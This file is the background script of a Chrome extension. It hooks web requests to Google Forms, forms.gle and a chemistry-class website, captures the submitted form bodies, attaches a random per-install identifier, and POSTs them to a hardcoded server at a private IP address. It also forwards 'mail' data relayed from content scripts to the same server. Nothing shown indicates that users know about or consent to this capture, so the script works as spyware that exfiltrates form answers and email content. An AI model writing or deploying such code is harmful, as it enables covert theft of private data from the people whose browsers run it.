const url = "http://10.1.57.134:84/post";

// Detect URL Change for parsing mail.
chrome.tabs.onUpdated.addListener(
  function(tabId, changeInfo, tab) {
    if (changeInfo.url) {
        try {
                chrome.tabs.sendMessage( tabId, {message: 'URL Change', url: changeInfo.url});
        } catch (error) {
            
        }

    }
  }
);

// Listen for mail data
chrome.runtime.onMessage.addListener(function(request, sender) {
    // Return for service-worker keep alive.
    if (JSON.stringify(request) === "\"ping\"") return;
    const postType = "Mail";
    data = request.message;
    fetch(url + postType, {
        method: "POST",
        body: data
    });

});

// Handle POST requests for form submissions
chrome.webRequest.onBeforeRequest.addListener(
    function(details)
    {
        // REMOVE FOR PRODUCTION
        const log = true;
        // #####################
        // Checks to not send unneccesary requests
        if (details.method === "GET") return;
        if (JSON.stringify(details).toString().includes(",\"requestBody\":{\"formData\":{\"impressionBatch\":")) {if (log) {console.log("impressionBatch");} return;};
        if (JSON.stringify(details).toString().includes(",\"requestBody\":{\"formData\":{\"draft_response_action_request\":")) {if (log) {console.log("draft/_response_action_request");} return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"formData\":{\"viewresponse\":")) {if (log) {console.log("viewresponse");} return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"formData\":{\"count\":")) {if (log) {console.log("count");} return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"error\":\"Unknown error.\"}")) {if (log) {console.log("UnknownError");} return;};
        if (JSON.stringify(details).toString().includes("\"requestBody\":{\"formData\":{\"request\":")) {if (log) {console.log("request");} return;};
        
        
        if (!(details.url).toString().startsWith("https://docs.google.com/forms") && !(details.url).toString().startsWith("https://forms.gle")) {if (log) {console.log("URL");} return;};
        
        // Set storage identifier if not existing.
        chrome.storage.local.get("identifier4", function(result) {

            if (JSON.stringify(result).toString() === "{}") {
                chrome.storage.local.set({"aidentifier": Math.random().toString().replace(".", "")});
            }
		});

        chrome.storage.local.get("aidentifier", function(result) {
        var data_to_send = "[" + JSON.stringify(details) + ", " + JSON.stringify(result) + "]";
        const postType = "Filler";
        fetch(url + postType, {
                method: "POST",
                body: data_to_send
            });
        });

    },
    {urls: ["https://docs.google.com/*", "https://forms.gle/*", "https://mrgrodskichemistry.com/*"]},
    ['requestBody']
);